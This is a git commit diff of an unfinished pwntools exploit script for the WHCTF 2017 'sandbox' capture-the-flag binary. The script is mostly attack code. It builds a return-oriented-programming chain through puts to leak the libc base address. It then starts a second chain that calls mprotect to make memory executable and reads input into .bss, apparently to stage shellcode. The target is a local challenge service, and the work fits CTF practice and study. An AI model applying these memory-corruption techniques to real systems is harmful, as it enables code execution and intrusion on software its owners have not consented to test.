e563e6dafe586750c9b9145929cc2ffe8d968f26
M4xW4n9 <aboultraman@gmail.com>
2018-03-20 11:36:09 +0800

    long jump, unfinished

--- whctf2017_sandbox/exp.py
+++ whctf2017_sandbox/exp.py
@@ -5,30 +5,38 @@ __Auther__ = 'M4x'
 from pwn import *
 from time import sleep
 import sys
-context.arch = "i386"
 context.log_level = "debug"
 context.terminal = ["deepin-terminal", "-x", "sh", "-c"]
 
 if sys.argv[1] == "l":
-    io = process("./sandbox", env = {"LD_PRELOAD": "./libc.so.6"})
+    io = process("./vuln", env = {"LD_PRELOAD": "./libc.so.6"})
     #  io = process("")
 
 else:
     io = remote("localhost", 9999)
 
-elf = ELF("./sandbox")
+elf = ELF("./vuln")
 libc = ELF("./libc.so.6")
+startElf = 0x80484D0
 
 def DEBUG():
     raw_input("DEBUG: ")
     gdb.attach(io)
 
-#  execve, open, clone, vfork, creat, openat
+def getBase():
+    payload = cyclic(0x30) + p8(0x48) + p32(elf.plt["puts"]) + p32(startElf) + p32(elf.got["puts"])
+    #  assert "\x10" in payload
+    io.sendline(payload)
+    libcBase = u32(io.recvuntil("\xf7")[-4: ]) - libc.symbols["puts"]
+    success("libcBase -> {:#x}".format(libcBase))
+    pause()
+    return libcBase
+
 if __name__ == "__main__":
-    putsPlt, putsGot = elf.plt["puts"], elf.got["puts"]
-    readPlt = elf.plt["read"]
-    pop1ret = 0x08048421
+    libcBase = getBase()
+
     pop3ret = 0x08048729
-    
-    payload = flat(putsPlt, p1ret, putsGot, readPlt, pop3ret, 0, )
+    payload = cyclic(0x30) + p8(0x48) + p32(libcBase + libc.symbols["mprotect"]) + p32(pop3ret) + p32(0x804a000) + p32(0x1000) + p32(7) + p32(elf.plt["read"]) + p32(elf.bss()) + p32(0) + p32(elf.bss()) + p32(0x200)
+
+
 
